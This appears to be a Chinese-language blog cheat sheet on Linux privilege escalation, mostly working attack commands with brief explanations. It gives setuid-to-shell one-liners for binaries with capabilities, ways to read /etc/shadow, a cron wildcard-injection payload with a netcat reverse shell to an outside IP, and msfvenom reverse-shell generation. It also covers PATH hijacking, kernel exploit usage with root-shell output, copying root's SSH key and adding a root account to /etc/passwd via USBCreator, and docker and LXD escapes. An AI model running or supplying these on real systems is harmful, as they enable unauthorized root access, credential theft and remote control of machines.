+<p>Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。<br>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</p>
+</blockquote>
+<h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><ul>
+<li>getcap</li>
+<li>setcap</li>
+<li>capsh</li>
+<li>filecap</li>
+</ul>
+<p>这些命令来自libcap和labcap-ng包。如名字一样，get用于查询，set用于设置，capsh则用于查当前shell进程的capabilities，filecap既能设置也能查询。</p>
+<h3 id="查找设置了Capabilities的可执行文件"><a href="#查找设置了Capabilities的可执行文件" class="headerlink" title="查找设置了Capabilities的可执行文件"></a>查找设置了Capabilities的可执行文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex <span class="string">'python import os; os.setuid(0)'</span> -ex <span class="string">'!sh'</span> -ex quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">"posix_setuid(0); system('/bin/sh');"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import os; os.setuid(0); os.system("/bin/sh")'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="rvim"><a href="#rvim" class="headerlink" title="rvim"></a>rvim</h3><p>需要支持python3模块。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rvim -c <span class="string">':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -c <span class="string">':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar可以使用cap_dac_read_search绕过文件的读权限检查以及目录的读/执行权限的检查，来读取敏感信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar cvf shadow.tar &#x2F;etc&#x2F;shadow  &#x2F;&#x2F;创建压缩文件</span><br><span class="line"></span><br><span class="line">tar -xvf shadow.tar  &#x2F;&#x2F;解压缩</span><br><span class="line"></span><br><span class="line">cd etc  &#x2F;&#x2F;进入解压缩的目录</span><br><span class="line"></span><br><span class="line">chmod +r shadow  &#x2F;&#x2F;赋予读权限</span><br><span class="line"></span><br><span class="line">cat shadow | grep root  &#x2F;&#x2F;查看shadow文件的内容</span><br></pre></td></tr></table></figure>
+<p>zip等程序也可以达到相同的目标。</p>
+<p>问题：如果给tar设置 cap_setuid 能否使用通配符提权呢？</p>
+<blockquote>
+<p>结果：好的，不行</p>
+</blockquote>
+<h3 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h3><p>当openssl的Capabilities为空时。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用openssl生成证书</span><br><span class="line"></span><br><span class="line">cd &#x2F;tmp</span><br><span class="line"></span><br><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;启动web服务器，监听1337端口</span><br><span class="line"></span><br><span class="line">cd &#x2F;</span><br><span class="line"></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line">openssl s_server -key &#x2F;tmp&#x2F;key.pem -cert &#x2F;tmp&#x2F;cert.pem -port 1337 -HTTP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;访问本机的web服务，读取&#x2F;etc&#x2F;shadow文件</span><br><span class="line"></span><br><span class="line">curl -k “https:&#x2F;&#x2F;127.0.0.1:8000&#x2F;etc&#x2F;shadow“</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="cron-jobs-提权"><a href="#cron-jobs-提权" class="headerlink" title="cron jobs 提权"></a>cron jobs 提权</h2><p>cron daemon是它可以安排在特定时间，做特定工作。<br>如果你不了解crontab，你可以看看<a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjOitqzkuXoAhWHUN4KHcQEA4oQFjAAegQIARAB&url=http%3A%2F%2Fcn.linux.vbird.org%2Flinux_basic%2F0430cron.php&usg=AOvVaw0Eocer1SxnUTJnLF6i1fdp" target="_blank" rel="noopener">这里</a><br>总而言之，crontab可以安排工作。而它的格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># * * * * * user command</span><br><span class="line">1 0 24 * * * root touch &#x2F;root&#x2F;hello.txt</span><br></pre></td></tr></table></figure>
+<p>ID 分 时 日 月 周 用户 命令<br>一个星号代表一个数，而数则表示时间。<br>表示每天的24点整，root用户在家目录中创建一个hello.txt的文件</p>
+<h3 id="cron-jobs-文件权限（文件重写）"><a href="#cron-jobs-文件权限（文件重写）" class="headerlink" title="cron jobs 文件权限（文件重写）"></a>cron jobs 文件权限（文件重写）</h3><p>而如果你刚好看到排程中，有一个以root用户执行的脚本，而恰好那个脚本可以让普通用户写入。<br>那么你可以重写那个脚本，执行你想要的操作(如msfvenom生成的木马)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_netcat lhost&#x3D;LOCALIP lport&#x3D;8888 R</span><br></pre></td></tr></table></figure>
+<p>生成一个可以反弹到netcat的shell。R参数是格式控制，剔除bad characters。<br>把msfvenom输出的代码写入你可以写入的脚本就可以了。<br>监听指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+<p>开启监听端口后，等待工作排程的执行。一旦执行，那你应该会获得一个root的shell了。</p>
+<h3 id="cron-jobs环境变量提权"><a href="#cron-jobs环境变量提权" class="headerlink" title="cron jobs环境变量提权"></a>cron jobs环境变量提权</h3><p><strong>只有在crontab有添加用户变量的前提下做</strong></p>
+<p>如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;home&#x2F;user:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">1 0 24 * * * bash shell.sh</span><br></pre></td></tr></table></figure>
+
+
+<p>那么此时，我们就可以修改在<code>/home/user</code>下新建一个名为<code>shell.sh</code>的文件，脚本内容可以是直接运行一个shell，也可以直接netcat反向连接给攻击机。<br>新建好之后要给<code>shell.sh</code>添加运行权限。</p>
+<h3 id="cron-jobs-通配符提权"><a href="#cron-jobs-通配符提权" class="headerlink" title="cron jobs 通配符提权"></a>cron jobs 通配符提权</h3><p>通配符提权相关文章:</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/72965.html" target="_blank" rel="noopener">利用通配符实现Linux本地提权-安全脉搏</a></li>
+<li><a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">如何使用Cron Jobs实现Linux提权</a></li>
+<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" target="_blank" rel="noopener">Exploiting wildcards on Linux</a></li>
+</ul>
+<p><code>cat /etc/crontab</code> 内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">1 0 24 * * * tar cf &#x2F;home&#x2F;milesydson&#x2F;backups&#x2F;backup.tgz &#x2F;var&#x2F;www&#x2F;html&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>利用方式如下</p>
+<figure class="highlight shell"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo ""&gt;"--checkpoint-action=exec=sh shell.sh"</span><br><span class="line">echo ""&gt;"--checkpoint=1"</span><br><span class="line">echo "mkfifo /tmp/cflw;nc 10.10.58.45 8888 0&lt;/tmp/clfw |/bin/sh &gt;/tmp/cflw 2&gt;&amp;1"&gt;shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>但是查看crontab不能只查看/etc/crontab一个地方，还要看/etc/cron.*的任务，系统定时任务，看看有没什么能利用的<br><img src="https://images.atsud0.me/images/post/Screenshot_20200623_162209.jpg" alt=""></p>
+<p>以及使用<code>crontab -l</code>也看下</p>
+<h2 id="环境变量提权-劫持环境变量"><a href="#环境变量提权-劫持环境变量" class="headerlink" title="环境变量提权(劫持环境变量)"></a>环境变量提权(劫持环境变量)</h2><p>什么是环境变量？</p>
+<blockquote>
+<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user run any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.<br>It is very simple to view the Path of the relevant user with help of the command “echo $PATH”.</p>
+</blockquote>
+<p>PATH是Linux和类似Unix的操作系统中的环境变量，它指定包含可执行程序的目录。 当用户在终端中运行任何命令时，它会响应用户执行的命令，在PATH变量的帮助下搜索可执行文件。</p>
+<blockquote>
+<p>使用一个环境变量对一个SUID二进制文件进行提权的话，需要有一个前提条件，那就是：系统管理员错误的写了脚本的路径（没有写绝对路径，如果没有写死路径，而是单单使用<code>ls</code>，这样我们就可以去修改系统的环境变量使其执行，我们伪造的文件。达到我们想要的效果。</p>
+</blockquote>
+<p>如果我们有一个具有SUID的二进制文件，运行它，观察它调用了什么系统进程 如<code>ps</code>，<code>ls</code>等。</p>
+<p>假设我们已经有一个具有SUID的二进制文件，而运行它后将会执行<code>ls</code>的程序。我们可以写一个模拟可执行文件<br>格式是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;你想要运行的命令&quot; &gt; 我们模仿的可执行文件</span><br></pre></td></tr></table></figure>
+<p>如上文所说，我们有一个可以执行ls的二进制文件，并且它具有SUID位。而我们是要拿到shell，那我们应该这样写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ls</span><br></pre></td></tr></table></figure>
+<p>给生成的文件，添加一个权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ls</span><br></pre></td></tr></table></figure>
+<p>最后，添加一个环境变量。我们生成的ls文件所处在的目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;生成的ls文件所再的目录:$PATH</span><br><span class="line">如果ls文件在&#x2F;tmp下就</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure>
+<p>而此时再执行一次那个具有SUID的二进制文件后，你就会发现我们已经拿到root的shell了。</p>
+<p><a href="https://www.anquanke.com/post/id/146799#h3-9" target="_blank" rel="noopener">利用PATH环境变量进行Linux提权</a></p>
+<blockquote>
+<p>思考题:如果看到crontab有一个自动执行某个脚本的任务，并且脚本内程序路径并没有被写死。是否能通过改变环境变量的方式去反弹一个shell呢?</p>
+</blockquote>
+<details>
+<summary>答案</summary>
+<pre><code>
+不能，因为crontab有单独的环境变量，不会被用户的修改的临时变量所影响。
+</code></pre>
+</details>
+
+
+<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><h3 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权 CVE-2016-5195"></a>脏牛提权 CVE-2016-5195</h3><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-5195" title="" target="">CVE-2016-5195</a>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dc32.c -o cowroot -pthread</span><br></pre></td></tr></table></figure>
+
+<p>去exploit-db找到利用补丁，编译后运行就可以了。</p>
+<h3 id="CVE-2003-0127"><a href="#CVE-2003-0127" class="headerlink" title="CVE-2003-0127"></a>CVE-2003-0127</h3><a href="https://www.exploit-db.com/exploits/3" title="" target="">ptrace&#x2F;kmod</a>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200615_195603.jpg" alt=""></p>
+<h3 id="CVE-2009-2698"><a href="#CVE-2009-2698" class="headerlink" title="CVE-2009-2698"></a>CVE-2009-2698</h3><p>{ % link “Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - ‘ip_append_data()’ Ring0 Privilege Escalation (1)” “<a href="https://www.exploit-db.com/exploits/9542&quot;" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/9542&quot;</a> % }</p>
+<h3 id="CVE-2010-2959"><a href="#CVE-2010-2959" class="headerlink" title="CVE-2010-2959"></a>CVE-2010-2959</h3><p><a href="https://www.exploit-db.com/exploits/14814" target="_blank" rel="noopener">Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - ‘CAN BCM’ Local Privilege Escalation</a></p>
+<p>内核：2.6.32-generic</p>
+<p>版本：Ubuntu 10.04</p>
+<p>ExpDB ID:14814</p>
+<h3 id="CVE-2013-2094"><a href="#CVE-2013-2094" class="headerlink" title="CVE-2013-2094"></a>CVE-2013-2094</h3><p>内核:2.6.38-8-server #42-Ubuntu<br>版本:Ubuntu 11.04<br><a href="https://www.exploit-db.com/download/26131" target="_blank" rel="noopener">CVE-2013-2094</a></p>
+<h3 id="CVE-2017-16995"><a href="#CVE-2017-16995" class="headerlink" title="CVE-2017-16995"></a>CVE-2017-16995</h3><p>影响内核</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Debian 9.0 kernel 4.9.0-3-amd64;</span><br><span class="line">Deepin 15.5 kernel 4.9.0-deepin13-amd64;</span><br><span class="line">ElementaryOS 0.4.1 kernel 4.8.0-52-generic;</span><br><span class="line">Fedora 25 kernel 4.8.6-300.fc25.x86_64;</span><br><span class="line">Fedora 26 kernel 4.11.8-300.fc26.x86_64;</span><br><span class="line">Fedora 27 kernel 4.13.9-300.fc27.x86_64;</span><br><span class="line">Gentoo 2.2 kernel 4.5.2-aufs-r;</span><br><span class="line">Linux Mint 17.3 kernel 4.4.0-89-generic;</span><br><span class="line">Linux Mint 18.0 kernel 4.8.0-58-generic;</span><br><span class="line">Linux Mint 18.3 kernel 4.13.0-16-generic;</span><br><span class="line">Mageia 6 kernel 4.9.35-desktop-1.mga6;</span><br><span class="line">Manjero 16.10 kernel 4.4.28-2-MANJARO;</span><br><span class="line">Solus 3 kernel 4.12.7-11.current;</span><br><span class="line">Ubuntu 14.04.1 kernel 4.4.0-89-generic;</span><br><span class="line">Ubuntu 16.04.2 kernel 4.8.0-45-generic;</span><br><span class="line">Ubuntu 16.04.3 kernel 4.10.0-28-generic;</span><br><span class="line">Ubuntu 17.04 kernel 4.10.0-19-generic;</span><br><span class="line">ZorinOS 12.1 kernel 4.8.0-39-generic.</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/45058" target="_blank" rel="noopener">msf</a></li>
+<li><a href="https://www.exploit-db.com/exploits/45010" target="_blank" rel="noopener">45010(好用！推荐)</a></li>
+</ul>
+<h3 id="CVE-2010-4170"><a href="#CVE-2010-4170" class="headerlink" title="CVE-2010-4170"></a>CVE-2010-4170</h3><p>内核:linux 2.6.18-194<br>版本:Centos5.5</p>
+<p>systemtap漏洞 linux 2.6.18-194内核提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;install uprobes &#x2F;bin&#x2F;sh&quot; &gt; exploit.conf; MODPROBE_OPTIONS&#x3D;&quot;-C exploit.conf&quot; staprun -u whatever</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://rhn.redhat.com/errata/RHSA-2010-0894.html" target="_blank" rel="noopener">RHEL</a></li>
+<li><a href="https://www.exploit-db.com/exploits/15620" target="_blank" rel="noopener">exploit</a></li>
+</ul>
+<h3 id="CVE-2002-0056"><a href="#CVE-2002-0056" class="headerlink" title="CVE-2002-0056"></a>CVE-2002-0056</h3><p>影响版本</p>
+<p>Linux Kernel 2.6.39 &lt; 3.2.2 (x86/x64)</p>
+<p>测试环境</p>
+<p>内核:3.0.0.12-generic</p>
+<p>版本：Ubuntu 11.10</p>
+<p>Explodb-id:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/18411" target="_blank" rel="noopener">18411</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35161" target="_blank" rel="noopener">35161</a></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o 18411 18411.c</span><br><span class="line">$ .&#x2F;18411                                                                                                                                                                                        [56&#x2F;1648]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;          Mempodipper        &#x3D;</span><br><span class="line">&#x3D;           by zx2c4          &#x3D;</span><br><span class="line">&#x3D;         Jan 21, 2012        &#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[+] Waiting for transferred fd in parent.</span><br><span class="line">[+] Executing child from child fork.</span><br><span class="line">[+] Opening parent mem &#x2F;proc&#x2F;5163&#x2F;mem in child.</span><br><span class="line">[+] Sending fd 3 to parent.</span><br><span class="line">[+] Assigning fd 5 to stderr.</span><br><span class="line">[+] Reading su for exit@plt.</span><br><span class="line">[+] Resolved exit@plt to 0x8049520.</span><br><span class="line">[+] Calculating su padding.</span><br><span class="line">[+] Seeking to offset 0x8049514.</span><br><span class="line">[+] Executing su with shellcode.</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>如果发现只执行到一半就没了，请检查你的获取的shell，该提权需要一个稳定的shell，如SSH。伪终端可以试下。</p>
+<h2 id="其他第三方程序"><a href="#其他第三方程序" class="headerlink" title="其他第三方程序"></a>其他第三方程序</h2><h3 id="USBCreator-D-Bus"><a href="#USBCreator-D-Bus" class="headerlink" title="USBCreator D-Bus"></a>USBCreator D-Bus</h3><p>原文:<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/" target="_blank" rel="noopener">USBCreator D-Bus Privilege Escalation in Ubuntu Desktop</a></p>
+<p>译文:<a href="https://www.anquanke.com/post/id/181937" target="_blank" rel="noopener"> Ubuntu桌面版USBCreator D-Bus权限提升漏洞分析 </a></p>
+<p>利用要求：</p>
+<ul>
+<li>sudo 用户组</li>
+</ul>
+<p>获取root的id_rsa。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator --method com.ubuntu.USBCreator.Image &#x2F;root&#x2F;.ssh&#x2F;id_rsa &#x2F;tmp&#x2F;id_rsa true</span><br></pre></td></tr></table></figure>
+
+<p>如果root id_rsa不存在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;passwd .&#x2F;</span><br><span class="line">echo &#39;new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt;.&#x2F;passwd</span><br><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator --method com.ubuntu.USBCreator.Image &#x2F;home&#x2F;nadav&#x2F;passwd &#x2F;etc&#x2F;passwd true</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h3><p>如果多用户借助docker共用一台机器的情况下，并且当前用户具有docker组的权限，可以直接运行一个镜像获得镜像里面的root权限，去修改镜像外的/etc/passwd来提权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>docker内部的/etc/passwd和外部的/etc/passwd一样，所以，可以直接往里面添加个用户。实现提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200712_215410.jpg" alt=""></p>
+<h4 id="Docker-remote-api"><a href="#Docker-remote-api" class="headerlink" title="Docker remote api"></a>Docker remote api</h4><p>如果目标服务器开启了<code>docker api</code> ，但是未做访问控制。那么我就可以通过 <code>docker client</code> 或者 <code>http</code> 直接请求就可以访问这个 API，通过这个接口，我们可以新建容器，甚至是获取宿主机的<code>shell</code>。</p>
+<ol>
+<li>修改 / root/.ssh/authorized_keys 或 /etc/passwd等文件</li>
+<li>修改 / etc/crontab 等计划任务文件</li>
+</ol>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>暂时没有。。。以后有空填坑</p>
+<p><a href="https://www.cnblogs.com/-mo-/p/11529387.html" target="_blank" rel="noopener">参考</a></p>
+<h3 id="LXD容器提权"><a href="#LXD容器提权" class="headerlink" title="LXD容器提权"></a>LXD容器提权</h3><p>LXD是Linux的一个轻量级容器，如果当前用户具有lxd组权限，则可以导入一个镜像，挂载主系统下的磁盘内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机器上执行</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此命令必须以root用户执行，之后会生成一个tar.gz的压缩包。</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标系统中执行</span></span><br><span class="line">wget http://Your-Vps-IP/alpine-v3.12-x86_64-20200908_2138.tar.gz -O /tmp/alpine-v3.12.tar.gz</span><br><span class="line">lxc image import ./alpine-v3.12.tar.gz --<span class="built_in">alias</span> alpine-v3.12</span><br><span class="line">lxc init alpine-v3.12 ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20200909095740510.png" alt="image-20200909095740510"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20200909095753491.png" alt="image-20200909095753491"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20200909095818082.png" alt="image-20200909095818082"></p>
+<h3 id="Kubernetes-容器"><a href="#Kubernetes-容器" class="headerlink" title="Kubernetes 容器"></a>Kubernetes 容器</h3><p>（（还没实验，先留坑</p>
+<h4 id="CVE-2018-1002105"><a href="#CVE-2018-1002105" class="headerlink" title="CVE-2018-1002105"></a>CVE-2018-1002105</h4><h4 id="CVE-2017-1002101"><a href="#CVE-2017-1002101" class="headerlink" title="CVE-2017-1002101"></a>CVE-2017-1002101</h4><h3 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h3><p>参考文章:</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/1491" title="" target="">Mysql提权思路</a></li>
+<li><a href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83/" title="" target="">mysql提权</a></li>
+<li><a href="https://www.cnblogs.com/jerrylocker/p/10890128.html" title="" target="">MySQL获取webshell的几种方式</a>
+
+</li>
+</ul>
+<h4 id="sql注入读取文件without-sqlmap"><a href="#sql注入读取文件without-sqlmap" class="headerlink" title="sql注入读取文件without sqlmap"></a>sql注入读取文件without sqlmap</h4><p>示例： 读取/etc/passwd。</p>
